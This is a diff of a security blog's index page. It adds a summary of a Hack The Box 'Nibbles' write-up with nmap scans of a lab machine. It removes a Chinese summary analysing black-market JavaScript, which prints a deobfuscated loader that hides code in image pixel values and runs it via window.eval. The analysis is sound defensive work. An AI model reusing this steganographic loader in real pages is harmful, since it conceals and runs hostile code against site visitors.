@@ -219,6 +219,24 @@
       
         <article class="post-entry">
   <header class="post-header">
+    <h3 class="post-title"><a href="https://madneal.com/post/nibbles-hack-the-box/" class="post-link">Nibbles - Hack the box</a></h3>
+    <p class="post-meta">@Neal · Mar 17, 2019 · 6 min read</p>
+  </header>
+  
+  <p class="post-summary">
+Introduction Target: 10.10.10.75(OS: Linux) Kali linux: 10.10.16.44
+Information Enumeration Firstly, detect the open ports:
+nmap -sT -p- --min-rate 10000 -oA openports 10.10.10.75 There are not too many open ports, just 80 and 22. Detect the detailed services of the open ports:
+nmap -sC -sV -oA services 10.10.10.75 Nothing special found. The only clue may be the open port of 80. To be honest, the box with less open ports is easier in general.
+</p>
+  <footer class="post-footer">
+    <a class="read-more" href="https://madneal.com/post/nibbles-hack-the-box/">Read More →</a>
+  </footer>
+</article>
+
+      
+        <article class="post-entry">
+  <header class="post-header">
     <h3 class="post-title"><a href="https://madneal.com/post/cronos-hack-the-box/" class="post-link">Cronos -- hack the box</a></h3>
     <p class="post-meta">@Neal · Mar 15, 2019 · 3 min read</p>
   </header>
@@ -394,24 +412,6 @@ from docxtpl import DocxTemplate, InlineImage # for height and width you have to
 </p>
   <footer class="post-footer">
     <a class="read-more" href="https://madneal.com/post/%E5%88%A9%E7%94%A8python%E7%94%9F%E6%88%90%E5%8F%AF%E8%A7%86%E5%8C%96%E6%8A%A5%E5%91%8A/">Read More →</a>
-  </footer>
-</article>
-
-      
-        <article class="post-entry">
-  <header class="post-header">
-    <h3 class="post-title"><a href="https://madneal.com/post/%E9%BB%91%E4%BA%A7%E4%BB%A3%E7%A0%81%E8%A7%A3%E5%AF%86--%E5%88%A9%E7%94%A8canvas%E5%8A%A0%E8%BD%BD%E4%BB%A3%E7%A0%81/" class="post-link">黑产代码解密--利用canvas加载代码</a></h3>
-    <p class="post-meta">@Neal · Aug 12, 2018 · 3 min read</p>
-  </header>
-  
-  <p class="post-summary">前段时间获取到黑产的一些代码，不得不感叹黑产的代码实在在写的是好得很，思路巧妙，环环相扣。不得不说，技术不好，黑产都做不了了。虽然分析了好多天，但是也只是一知半解。这里抽出一小部分来讲一下。二话不说，先上代码：
-最初的代码是经过混淆的，代码经过整理如下：
-var createImgElement = function(urla, b) { var imgElement = document.createElement(&#39;img&#39;); var canvasEle = document.createElement(&#39;canvas&#39;); imgElement[&#39;crossOrigin&#39;] = true; imgElement[&#39;onload&#39;] = function() { canvasEle.width = this.width; canvasEle.height = this.height; var canvasContext = canvasEle.getContext(&#39;2d&#39;) canvasContext.drawImage(this, 0, 0, this.width, this.height); for (var canvasContext = canvasContext.getImageData(0, 0, this.width, this.height), cancasDataLength = canvasContext.data.length, arr = [], i = 0; i &lt; cancasDataLength; i &#43;= 4) { var code = canvasContext.data[i] var code1 = canvasContext.data[i &#43; 1] var code2 = canvasContext.data[i &#43; 2] canvasContext.data[i &#43; 2].toString(16); 1 == code1.length &amp;&amp; (code1 = 0 &#43; code1); 1 == code2.length &amp;&amp; (code2 = 0 &#43; code2); 0 != Number(code &#43; code1 &#43; code2) &amp;&amp; arr.push(String.fromCharCode(Number(code &#43; code1 &#43; code2))); } window.eval(arr.join(&#39;&#39;)); console.log(arr.join(&#39;&#39;)); b &amp;&amp; b(); } imgElement.src = urla; }; 这段代码的主要目的是通过使用一个图片的连接，将这个图片加载到 canvas 中，再利用 canvas 去获取恶意代码并执行。通过图片去隐藏信息是一种常见的做法，这段就是通过 canvas 去执行图片中隐含的恶意代码。这段还支持传入回调函数，若回调函数存在，则执行回调函数。
-在这里还利用一个计算机图像的知识，即像素中的 RGBA 值。Canvas 中的 ImageData 对象中每一个像素都包含了4个信息，即 RGBA 值。
-R - 红色 (0-255) G - 绿色 (0-255) B - 蓝色 (0-255) A - alpha 通道 (0-255; 0 是透明的，255 是完全可见的) 通过将代码转化为 ascii 码，将其隐藏在图片中的 RGB 信息中，黑产的 alpha 值都设置的为255。这样非常巧妙地就实现了代码信息和图片之间的转换。
-</p>
-  <footer class="post-footer">
-    <a class="read-more" href="https://madneal.com/post/%E9%BB%91%E4%BA%A7%E4%BB%A3%E7%A0%81%E8%A7%A3%E5%AF%86--%E5%88%A9%E7%94%A8canvas%E5%8A%A0%E8%BD%BD%E4%BB%A3%E7%A0%81/">Read More →</a>
   </footer>
 </article>
 
